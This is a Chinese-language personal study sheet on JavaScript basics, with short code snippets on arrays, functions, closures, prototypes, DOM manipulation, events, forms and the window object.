<h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> x <span class="comment">// 返回字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">in</span> <span class="comment">// 判断是否有属性</span></span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure>




<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> cars=<span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">cars[<span class="number">0</span>]=<span class="string">&quot;Saab&quot;</span>;</span><br><span class="line">cars[<span class="number">1</span>]=<span class="string">&quot;Volvo&quot;</span>;</span><br><span class="line">cars[<span class="number">2</span>]=<span class="string">&quot;BMW&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cars=[<span class="string">&quot;Saab&quot;</span>,<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cars=<span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;Saab&quot;</span>,<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>数组操作：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">concat</span>()    <span class="comment">// 数组合并</span></span><br><span class="line"><span class="title function_">join</span>()      <span class="comment">// 变成字符串</span></span><br><span class="line"><span class="title function_">pop</span>()       <span class="comment">// 删除最后一个</span></span><br><span class="line"><span class="title function_">push</span>()      <span class="comment">// 末尾添加</span></span><br><span class="line"><span class="title function_">reverse</span>()   <span class="comment">// 翻转</span></span><br><span class="line"><span class="title function_">shift</span>()     <span class="comment">// 删除第一个</span></span><br><span class="line"><span class="title function_">slice</span>()     <span class="comment">// 切片</span></span><br><span class="line"><span class="title function_">sort</span>()      <span class="comment">// 排序</span></span><br><span class="line"><span class="title function_">splice</span>()    <span class="comment">// 添加元素</span></span><br><span class="line"><span class="title function_">toString</span>()  <span class="comment">// 转为字符串</span></span><br><span class="line"><span class="title function_">unshift</span>()   <span class="comment">// 开头添加</span></span><br></pre></td></tr></table></figure>


<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>定义：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params">var1,var2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> x;</span><br><span class="line">    <span class="comment">// 代码</span></span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func = <span class="keyword">function</span> (<span class="params">var1, var2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> x;</span><br><span class="line">    <span class="comment">// 代码</span></span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用</span></span><br><span class="line"><span class="title function_">myFunction</span>(argument1,argument2)</span><br><span class="line"><span class="title function_">func</span>(argument1,argument2)</span><br></pre></td></tr></table></figure>

<p>函数自调用：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="string">&quot;Hello!!&quot;</span>;      <span class="comment">// 我将调用自己</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>箭头函数：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(参数<span class="number">1</span>, 参数<span class="number">2</span>, …, 参数N) =&gt; &#123; 函数声明 &#125;</span><br><span class="line">() =&gt; &#123;函数声明&#125;</span><br><span class="line"><span class="comment">// IE11 及更早 IE 版本不支持箭头函数。</span></span><br></pre></td></tr></table></figure>

<p>闭包：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> add = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> counter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;<span class="keyword">return</span> counter += <span class="number">1</span>;&#125;</span><br><span class="line">&#125;)();</span><br><span class="line"> </span><br><span class="line"><span class="title function_">add</span>(); <span class="title function_">add</span>(); <span class="title function_">add</span>();</span><br><span class="line"><span class="comment">// 计数器为 3</span></span><br></pre></td></tr></table></figure>

<p>call, apply</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">fun.<span class="title function_">call</span>(obj, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">fun.<span class="title function_">apply</span>(obj, [<span class="number">2</span>, <span class="number">3</span>]);</span><br></pre></td></tr></table></figure>



<h1 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h1><p>定义对象：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person=&#123;</span><br><span class="line">    firstname : <span class="string">&quot;John&quot;</span>,</span><br><span class="line">    lastname  : <span class="string">&quot;Doe&quot;</span>,</span><br><span class="line">    id        :  <span class="number">5566</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问属性</span></span><br><span class="line">name = person.<span class="property">lastname</span>;</span><br><span class="line">name = person[<span class="string">&quot;lastname&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问方法</span></span><br><span class="line">name = person.<span class="title function_">fullName</span>();</span><br></pre></td></tr></table></figure>

<p>创建对象：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 一般用工厂函数创建对象</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">person</span>(<span class="params">firstname,lastname,age,eyecolor</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">firstname</span>=firstname;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">lastname</span>=lastname;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">eyecolor</span>=eyecolor;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">changeName</span>=changeName;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">changeName</span>(<span class="params">name</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">lastname</span>=name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个已存在的对象构造器中是不能添加新的属性的。</p>
<p>原型对象:所有的 JavaScript 对象都会包含一个 prototype（原型对象）。</p>
<p>可以使用 prototype 属性给对象的构造函数添加新的属性和方法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">first, last, age, eyecolor</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">firstName</span> = first;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">lastName</span> = last;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">eyeColor</span> = eyecolor;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 或 __proto__</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">nationality</span> = <span class="string">&quot;English&quot;</span>;</span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">name</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&quot; &quot;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否包含某个属性 </span></span><br><span class="line"><span class="string">&quot;name&quot;</span> <span class="keyword">in</span> person;  <span class="comment">// 会检查通过原型创建的属性</span></span><br><span class="line">person.<span class="title function_">hasOwnProperty</span>() <span class="comment">// 不检查原型</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>this是指调用它的上下文。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span> </span><br></pre></td></tr></table></figure>



<h1 id="日期"><a href="#日期" class="headerlink" title="日期"></a>日期</h1><p>初始化一个日期：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Date</span>() <span class="comment">// 当前日期和时间</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Date</span>(milliseconds) <span class="comment">//返回从 1970 年 1 月 1 日至今的毫秒数</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Date</span>(dateString)</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Date</span>(year, month, day, hours, minutes, seconds, milliseconds)</span><br></pre></td></tr></table></figure>

<p>设置日期：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myDate=<span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">myDate.<span class="title function_">setFullYear</span>(<span class="number">2010</span>,<span class="number">0</span>,<span class="number">14</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> myDate=<span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">myDate.<span class="title function_">setDate</span>(myDate.<span class="title function_">getDate</span>()+<span class="number">5</span>);</span><br></pre></td></tr></table></figure>





<h1 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h1><h1 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h1><h2 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a>基本语句</h2><p>for：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person=&#123;<span class="attr">fname</span>:<span class="string">&quot;John&quot;</span>,<span class="attr">lname</span>:<span class="string">&quot;Doe&quot;</span>,<span class="attr">age</span>:<span class="number">25</span>&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (x <span class="keyword">in</span> person)  <span class="comment">// x 为属性名</span></span><br><span class="line">&#123;</span><br><span class="line">    txt=txt + person[x];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>typeof：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="string">&quot;John&quot;</span>                <span class="comment">// 返回 string</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="number">3.14</span>                  <span class="comment">// 返回 number</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">false</span>                 <span class="comment">// 返回 boolean</span></span><br><span class="line"><span class="keyword">typeof</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]             <span class="comment">// 返回 object</span></span><br><span class="line"><span class="keyword">typeof</span> &#123;<span class="attr">name</span>:<span class="string">&#x27;John&#x27;</span>, <span class="attr">age</span>:<span class="number">34</span>&#125; <span class="comment">// 返回 object</span></span><br></pre></td></tr></table></figure>

<h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    ...    <span class="comment">//异常的抛出</span></span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    ...    <span class="comment">//异常的捕获与处理</span></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    ...    <span class="comment">//结束处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>使用 console：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">123</span>);</span><br></pre></td></tr></table></figure>

<p>使用 Debugger：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">15</span> * <span class="number">5</span>;</span><br><span class="line"><span class="keyword">debugger</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementbyId</span>(<span class="string">&quot;demo&quot;</span>).<span class="property">innerHTML</span> = x;</span><br></pre></td></tr></table></figure>

<h2 id="严格模式"><a href="#严格模式" class="headerlink" title="严格模式"></a>严格模式</h2><h1 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h1><h2 id="this"><a href="#this" class="headerlink" title="this"></a>this</h2><p>在方法中，this 表示该方法所属的对象。<br>如果单独使用，this 表示全局对象。<br>在函数中，this 表示全局对象。<br>在函数中，在严格模式下，this 是未定义的(undefined)。<br>在事件中，this 表示接收事件的元素。<br>类似 call() 和 apply() 方法可以将 this 引用到任何对象。</p>
<h2 id="void"><a href="#void" class="headerlink" title="void"></a>void</h2><p>void 操作符指定要计算一个表达式但是不返回值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a,b,c;</span><br><span class="line">a = <span class="keyword">void</span> ( b = <span class="number">5</span>, c = <span class="number">7</span> );</span><br><span class="line"><span class="comment">// a 的值为 undefined</span></span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">func</span>()</span><br><span class="line"><span class="attr">javascript</span>:<span class="keyword">void</span> <span class="title function_">func</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="title function_">void</span>(<span class="title function_">func</span>())</span><br><span class="line"><span class="attr">javascript</span>:<span class="title function_">void</span>(<span class="title function_">func</span>())</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span>&gt;</span>单击此处什么也不会发生<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果要定义一个死链接使用<code>javascript:void(0)</code>。</p>
<h1 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h1><p>访问表单字段：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">validateForm</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&quot;myForm&quot;</span>][<span class="string">&quot;fname&quot;</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (x == <span class="literal">null</span> || x == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;需要输入名字。&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>验证API：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">checkValidity</span>()  <span class="comment">// 对INPUT使用</span></span><br><span class="line"><span class="title function_">setCustomValidity</span>()  <span class="comment">// 设置 input 元素的 validationMessage 属性，用于自定义错误提示信息的方法。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证属性</span></span><br><span class="line">customError	<span class="comment">//设置为 true, 如果设置了自定义的 validity 信息。</span></span><br><span class="line">patternMismatch	<span class="comment">//设置为 true, 如果元素的值不匹配它的模式属性。</span></span><br><span class="line">rangeOverflow	<span class="comment">//设置为 true, 如果元素的值大于设置的最大值。</span></span><br><span class="line">rangeUnderflow	<span class="comment">//设置为 true, 如果元素的值小于它的最小值。</span></span><br><span class="line">stepMismatch	<span class="comment">//设置为 true, 如果元素的值不是按照规定的 step 属性设置。</span></span><br><span class="line">tooLong	<span class="comment">//设置为 true, 如果元素的值超过了 maxLength 属性设置的长度。</span></span><br><span class="line">typeMismatch	<span class="comment">//设置为 true, 如果元素的值不是预期相匹配的类型。</span></span><br><span class="line">valueMissing	<span class="comment">//设置为 true，如果元素 (required 属性) 没有值。</span></span><br><span class="line">valid	<span class="comment">//设置为 true，如果元素的值是合法的。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;id1&quot;</span>).<span class="property">validity</span>.<span class="property">rangeOverflow</span>) &#123;</span><br><span class="line">    txt = <span class="string">&quot;输入的值太大了&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><p>数据为 键&#x2F;值 对。<br>数据由逗号分隔。<br>大括号保存对象<br>方括号保存数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 解析为对象</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(text);</span><br><span class="line"><span class="comment">// 转换为Json</span></span><br><span class="line"><span class="title class_">JSON</span>.<span class="title function_">stringify</span>()</span><br></pre></td></tr></table></figure>

<h1 id="Require"><a href="#Require" class="headerlink" title="Require"></a>Require</h1><p>该部分只能在服务器中使用。</p>
<p>它是在运行时动态加载，输出的是值的拷贝。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = fs</span><br><span class="line"><span class="comment">// 输入</span></span><br><span class="line"><span class="keyword">const</span> fn = <span class="built_in">require</span>(<span class="string">&#x27;fn&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h1 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h1><p>查找标签：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过 id 查找 HTML 元素</span></span><br><span class="line"><span class="keyword">var</span> x=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;intro&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过标签名查找 HTML 元素</span></span><br><span class="line"><span class="keyword">var</span> x=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;main&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> y=x.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过类名找到 HTML 元素</span></span><br><span class="line"><span class="keyword">var</span> x=<span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;intro&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>修改内容：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 全部修改</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="title class_">Date</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改变标签内容</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;p1&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;新文本!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改变标签属性</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;image&quot;</span>).<span class="property">src</span>=<span class="string">&quot;landscape.jpg&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改CSS样式</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;p2&quot;</span>).<span class="property">style</span>.<span class="property">color</span>=<span class="string">&quot;blue&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;p2&quot;</span>).<span class="property">style</span>.<span class="property">fontFamily</span>=<span class="string">&quot;Arial&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;p2&quot;</span>).<span class="property">style</span>.<span class="property">fontSize</span>=<span class="string">&quot;larger&quot;</span>;</span><br><span class="line"></span><br><span class="line">dom.<span class="property">className</span> = <span class="string">&quot;btn&quot;</span>;</span><br></pre></td></tr></table></figure>

<h1 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h1><p>设置方式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;checkCookies()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;p2&quot;</span>).<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>常用事件：<br>    onclick<br>    onload<br>    onchange<br>    onmouseover<br>    onmouseout<br>    onmousedown<br>    onmouseup<br>    onclick </p>
<p>鼠标坐标</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">clientX <span class="comment">// 相对于可见区域</span></span><br><span class="line">pageX  <span class="comment">// 相对于文档</span></span><br></pre></td></tr></table></figure>



<p>为DOM添加事件句柄，添加的事件句柄不会覆盖已存在的事件句柄。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">element.<span class="title function_">addEventListener</span>(event, <span class="keyword">function</span>, useCapture);</span><br><span class="line"><span class="comment">// 例如</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myBtn&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, displayDate);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 去除监听器</span></span><br><span class="line"><span class="title function_">removeEventListener</span>() </span><br><span class="line"></span><br><span class="line"><span class="comment">// event 兼容性问题</span></span><br><span class="line">event = event || <span class="variable language_">window</span>.<span class="property">event</span>;</span><br></pre></td></tr></table></figure>

<p>事件传递<code>useCapture</code>有两种方式：冒泡<code>false</code>与捕获<code>true</code>。</p>
<p>冒泡下定义了元素事件触发的顺序：</p>
<p>在捕获中，外部元素的事件会先被捕获，不触发，然后才会捕获内部元素的事件。</p>
<p>在冒泡中，内部元素的事件会先被触发，然后再触发外部元素；（委派）</p>
<p>捕获模式下则是：</p>
<p>在捕获中，外部元素的事件会先被触发，然后才会触发内部元素的事件。</p>
<p>也可以关闭事件传递：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">event.<span class="property">cancelBubble</span> = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<p>定时器</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> timer = <span class="built_in">setInterval</span>(callback, <span class="number">2000</span>);</span><br><span class="line"><span class="built_in">clearInterval</span>(timer);</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(callback, <span class="number">2000</span>)</span><br><span class="line"><span class="built_in">clearTimeout</span>()</span><br></pre></td></tr></table></figure>





<p>IE 8 及更早版本需要使用：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">x.<span class="title function_">attachEvent</span>(<span class="string">&quot;onclick&quot;</span>, myFunction);</span><br></pre></td></tr></table></figure>



<h1 id="DOM-元素"><a href="#DOM-元素" class="headerlink" title="DOM 元素"></a>DOM 元素</h1><p>HTML DOM 树：</p>
<ul>
<li>Document 对象<ul>
<li>html 标签<ul>
<li>head 标签<ul>
<li>title 标签<ul>
<li>text 属性</li>
</ul>
</li>
</ul>
</li>
<li>body 标签<ul>
<li>div 标签<ul>
<li>a 标签<ul>
<li>href 属性</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>添加，删除与替换：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 增加</span></span><br><span class="line"><span class="keyword">var</span> para = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> node = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(<span class="string">&quot;新的段落。&quot;</span>);</span><br><span class="line">para.<span class="title function_">appendChild</span>(node);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取父节点</span></span><br><span class="line"><span class="keyword">var</span> element = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;div1&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> child = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;p1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加入或插入</span></span><br><span class="line">element.<span class="title function_">appendChild</span>(para);</span><br><span class="line">element.<span class="title function_">insertBefore</span>(para, child);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除节点</span></span><br><span class="line"><span class="keyword">var</span> parent = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;div1&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> child = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;p1&quot;</span>);</span><br><span class="line">parent.<span class="title function_">removeChild</span>(child);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 替换节点</span></span><br><span class="line"><span class="keyword">var</span> para = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> node = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(<span class="string">&quot;这是一个新的段落。&quot;</span>);</span><br><span class="line">para.<span class="title function_">appendChild</span>(node);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> parent = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;div1&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> child = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;p1&quot;</span>);</span><br><span class="line">parent.<span class="title function_">replaceChild</span>(para, child);</span><br></pre></td></tr></table></figure>

<p>获取 DOM 集合（不是数组）：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取集合</span></span><br><span class="line"><span class="keyword">var</span> myCollection = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"><span class="comment">// 获取集合长度</span></span><br><span class="line">myCollection.<span class="property">length</span>;</span><br><span class="line"><span class="comment">// 获取某一元素</span></span><br><span class="line">y = myCollection[<span class="number">1</span>];</span><br></pre></td></tr></table></figure>

<p>获取节点列表（不是数组）：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myNodeList = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;p&quot;</span>);</span><br><span class="line">myNodelist.<span class="property">length</span>;</span><br><span class="line">y = myNodelist[<span class="number">1</span>];</span><br></pre></td></tr></table></figure>

<p>二者区别为：<br>HTMLCollection 元素可以通过 name，id 或索引来获取。<br>NodeList 只能通过索引来获取。<br>只有 NodeList 对象有包含属性节点和文本节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fun&#x27;</span>).<span class="property">dataset</span>.<span class="property">appId</span> = <span class="string">&#x27;hsfun&#x27;</span> <span class="comment">// &lt;div data-app-id=&quot;hsfun&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> f2 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fun&#x27;</span>).<span class="property">dataset</span>.<span class="property">appId</span> <span class="comment">// hsfun</span></span><br></pre></td></tr></table></figure>

<p>页面加载完成后执行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>操作CSS</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">box.<span class="property">style</span>.<span class="property">width</span> = <span class="string">&quot;300px&quot;</span>;</span><br></pre></td></tr></table></figure>





<h1 id="浏览器对象"><a href="#浏览器对象" class="headerlink" title="浏览器对象"></a>浏览器对象</h1><h2 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h2><p>表示浏览器窗口。</p>
<p>所有 JavaScript 全局对象、函数以及变量均自动成为 window 对象的成员。</p>
<p>全局变量是 window 对象的属性。</p>
<p>全局函数是 window 对象的方法。</p>
